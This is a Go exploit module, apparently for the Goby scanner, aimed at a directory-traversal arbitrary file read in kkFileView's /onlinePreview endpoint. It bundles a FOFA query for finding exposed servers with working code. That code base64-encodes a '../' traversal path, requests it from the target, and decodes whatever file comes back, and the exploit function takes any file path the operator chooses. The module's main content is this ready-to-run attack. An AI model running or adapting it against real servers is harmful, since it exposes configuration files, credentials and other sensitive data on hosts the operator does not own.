package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "kkFileView onlinePreview Arbitrary File Read",
    "Description": "<p>Keking kkFileView is a Spring-Boot online preview project for creating file documents of Keking Technology Co., Ltd. in China.</p><p>There is a security vulnerability in Keking kkFileview, which stems from reading arbitrary files through directory traversal vulnerabilities, which may lead to the leakage of sensitive files on related hosts.</p>",
    "Product": "kkFileView",
    "Homepage": "https://github.com/kekingcn/kkFileView/",
    "DisclosureDate": "2023-01-13",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"/onlinePreview?url\"",
    "GobyQuery": "body=\"/onlinePreview?url\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in Keking kkFileview, which stems from reading arbitrary files through directory traversal vulnerabilities, which may lead to the leakage of sensitive files on related hosts.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://github.com/kekingcn/kkFileView/\">https://github.com/kekingcn/kkFileView/</a></p>",
    "References": [
        "https://forum.butian.net/share/2088"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../pom.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "kkFileView onlinePreview 任意文件读取漏洞",
            "Product": "kkFileView",
            "Description": "<p>Keking kkFileView是中国凯京科技（Keking）公司的一个 Spring-Boot 打造文件文档在线预览项目。<br></p><p>Keking kkFileview 存在安全漏洞，该漏洞源于存在通过目录遍历漏洞读取任意文件，可能导致相关主机上的敏感文件泄漏。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://github.com/kekingcn/kkFileView/\">https://github.com/kekingcn/kkFileView/</a><br></p>",
            "Impact": "<p>Keking kkFileview 存在安全漏洞，该漏洞源于存在通过目录遍历漏洞读取任意文件，可能导致相关主机上的敏感文件泄漏。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "kkFileView onlinePreview Arbitrary File Read",
            "Product": "kkFileView",
            "Description": "<p>Keking kkFileView is a Spring-Boot online preview project for creating file documents of Keking Technology Co., Ltd. in China.<br></p><p>There is a security vulnerability in Keking kkFileview, which stems from reading arbitrary files through directory traversal vulnerabilities, which may lead to the leakage of sensitive files on related hosts.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://github.com/kekingcn/kkFileView/\">https://github.com/kekingcn/kkFileView/</a><br></p>",
            "Impact": "<p>There is a security vulnerability in Keking kkFileview, which stems from reading arbitrary files through directory traversal vulnerabilities, which may lead to the leakage of sensitive files on related hosts.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10786"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			base64Payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s/?fullfilename=../../../../pom.xml", u.FixedHostInfo)))
			uri := "/onlinePreview?url=" + base64Payload
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "<input hidden id=\"textData\" value=\"") {
				fileFind := regexp.MustCompile("<input hidden id=\"textData\" value=\"(.*?)\"/>").FindStringSubmatch(resp.RawBody)
				base64Decode, _ := base64.StdEncoding.DecodeString(fileFind[1])
				return strings.Contains(string(base64Decode), "DOCTYPE html")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filePath"].(string)
			base64Payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s/?fullfilename=%s", expResult.HostInfo.FixedHostInfo, cmd)))
			uri := "/onlinePreview?url=" + base64Payload
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "<input hidden id=\"textData\" value=\""){
				fileFind := regexp.MustCompile("<input hidden id=\"textData\" value=\"(.*?)\"/>").FindStringSubmatch(resp.RawBody)
				base64Decode, _ := base64.StdEncoding.DecodeString(fileFind[1])
				expResult.Output = string(base64Decode)
				expResult.Success = true
			}
			return expResult
		},
	))
}